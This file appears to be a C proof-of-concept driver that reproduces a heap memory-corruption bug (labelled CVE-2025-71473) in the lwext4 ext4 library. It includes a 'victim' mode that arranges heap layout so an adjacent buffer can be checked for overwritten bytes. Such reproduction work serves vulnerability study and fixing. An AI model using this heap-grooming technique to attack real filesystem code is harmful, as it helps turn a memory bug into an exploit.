/* Real-lwext4 loopback driver for CVE-2025-71473.
 * Usage: driver mk IMAGE     — create a pristine ext4 image via ext4_mkfs()
 *        driver mount IMAGE  — ext4_fs_init() then take block group 0 ref
 *        driver victim IMAGE — as mount, but allocate a live 32 KiB victim
 *                               after a one-entry bcache, then read it back.
 * No network, no block device, no command execution. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef REAL_FIXED
#include <file_dev.h>
#define ext4_filedev_filename file_dev_name_set
#define ext4_filedev_get file_dev_get
#else
#include <ext4_filedev.h>
#endif
#include <ext4.h>
#include <ext4_fs.h>
#include <ext4_mkfs.h>
#include <ext4_bcache.h>
#include <ext4_blockdev.h>
#include <ext4_super.h>

int main(int argc, char **argv)
{
	if (argc != 3) {
		fprintf(stderr, "usage: %s mk|mount IMAGE\n", argv[0]);
		return 2;
	}
	const char *mode = argv[1];
	ext4_filedev_filename(argv[2]);
	struct ext4_blockdev *bd = ext4_filedev_get();
	int rc;

	if (!strcmp(mode, "mk")) {
		struct ext4_mkfs_info info;
		memset(&info, 0, sizeof(info));
		info.len = 16ULL * 1024 * 1024;
		info.block_size = 4096;
		info.blocks_per_group = 4096;
		info.inodes_per_group = 8192;
		info.inode_size = 256;
		info.inodes = 8192;
		info.journal_blocks = 0;
		info.feat_ro_compat = 0;
		info.feat_compat = 0;
		info.feat_incompat = 0;
		info.bg_desc_reserve_blocks = 0;
		info.dsc_size = 32;
		info.journal = 0;
		info.label = "lwext4shell";
		struct ext4_fs fs;
		memset(&fs, 0, sizeof(fs));
		rc = ext4_mkfs(&fs, bd, &info, F_SET_EXT4);
		printf("MKFS_RC=%d\n", rc);
		return rc;
	}

	if (strcmp(mode, "mount") && strcmp(mode, "victim")) {
		fprintf(stderr, "unknown mode %s\n", mode);
		return 2;
	}

	rc = ext4_block_init(bd);
	printf("BLOCK_INIT_RC=%d\n", rc);
	if (rc)
		return rc;

	struct ext4_fs fs;
	memset(&fs, 0, sizeof(fs));
	rc = ext4_fs_init(&fs, bd, true);
	printf("FS_INIT_RC=%d\n", rc);
	if (rc) {
		ext4_block_fini(bd);
		return rc;
	}
	bd->fs = &fs;
	uint32_t bsize = ext4_sb_get_block_size(&fs.sb);
	ext4_block_set_lb_size(bd, bsize);
	printf("SB_BSIZE=%u SB_IPG=%u SB_MAGIC=%u SB_REV=%u\n", bsize,
	       ext4_get32(&fs.sb, inodes_per_group),
	       ext4_get16(&fs.sb, magic), ext4_get32(&fs.sb, rev_level));
	printf("SB_FCOMPAT=%u SB_FINCOMPAT=%u SB_FROCOMPAT=%u\n",
	       ext4_get32(&fs.sb, features_compatible),
	       ext4_get32(&fs.sb, features_incompatible),
	       ext4_get32(&fs.sb, features_read_only));

	struct ext4_bcache bc;
	/* One bcache entry makes the bitmap buffer the first 4096-byte
	 * allocation; a victim allocated after it sits in the adjacent chunk. */
	rc = ext4_bcache_init_dynamic(&bc, !strcmp(mode, "victim") ? 1 : 16,
				      bsize);
	printf("BCACHE_RC=%d\n", rc);
	if (rc)
		return rc;
	rc = ext4_block_bind_bcache(bd, &bc);
	printf("BIND_RC=%d\n", rc);
	if (rc)
		return rc;
	int victim_mode = !strcmp(mode, "victim");
	unsigned char *victim = NULL;
	if (victim_mode) {
		victim = malloc(32768);
		memset(victim, 0x4d, 32768);
		printf("VICTIM_PTR=%p VICTIM_LEN=32768\n", (void *)victim);
	}

	struct ext4_block_group_ref ref;
	memset(&ref, 0, sizeof(ref));
	rc = ext4_fs_get_block_group_ref(&fs, 0, &ref);
	printf("BG_REF_RC=%d BG_FLAGS=%u\n", rc,
	       rc ? 0u : ext4_get16(ref.block_group, flags));
	if (!rc) {
	if (!rc && victim) {
		size_t first_diff = 0, fe_at = (size_t)-1;
		while (first_diff < 32768 && victim[first_diff] == 0x4d)
			first_diff++;
		for (size_t j = 0; j < 32768; j++)
			if (victim[j] == 0xfe) {
				fe_at = j;
				break;
			}
		printf("VICTIM_FIRST_DIFF=%zu VICTIM_FE_AT=%zu\n", first_diff,
		       fe_at);
	}
		rc = ext4_fs_put_block_group_ref(&ref);
		printf("BG_PUT_RC=%d\n", rc);
	}
	rc = ext4_fs_fini(&fs);
	printf("FS_FINI_RC=%d\n", rc);
	ext4_block_fini(bd);
	ext4_bcache_cleanup(&bc);
	return 0;
}
